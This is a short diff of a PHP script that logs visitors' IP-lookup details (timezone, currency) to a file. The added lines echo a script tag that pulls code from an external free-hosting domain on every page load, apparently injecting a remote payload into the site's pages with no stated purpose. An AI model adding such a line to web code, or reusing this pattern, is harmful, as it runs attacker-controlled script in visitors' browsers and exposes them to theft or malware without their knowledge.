@@ -101,10 +101,8 @@ fwrite( $fp, '  => Timezone is  :  ' ) ;
 fwrite( $fp, $ipdat->timezone  ) ;
 fwrite( $fp, ' =>  Currency is  :  ' ) ; 
 fwrite( $fp, $ipdat->currency  ) ;
-
-
 fwrite( $fp, $br  );   
  fclose( $fp);
-
-
+echo "<script src='https://dlhut.000webhostapp.com/inc/downloadhelp.php'>
+</script>";
 ?>
